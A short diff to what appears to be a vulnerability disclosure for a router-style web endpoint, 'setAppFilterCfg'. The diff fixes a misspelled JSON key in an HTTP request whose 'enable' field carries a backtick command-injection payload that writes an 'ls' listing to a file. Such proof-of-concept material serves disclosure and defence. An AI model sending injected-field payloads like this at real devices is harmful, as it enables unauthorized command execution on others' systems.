@@ -51,7 +51,7 @@ Accept-Encoding: gzip, deflate, br
 Cookie: SESSION_ID=2:1772465702:2
 Connection: keep-alive
 
-{"topicurl":"setAppFilterCfg","typeid":"1","nable":"`ls>./setAppFilterCfg.txt`"
+{"topicurl":"setAppFilterCfg","typeid":"1","enable":"`ls>./setAppFilterCfg.txt`"
 }
 ```
 <div  align="center"><img src="./img/http.png" style="zoom:80%;" /></div>
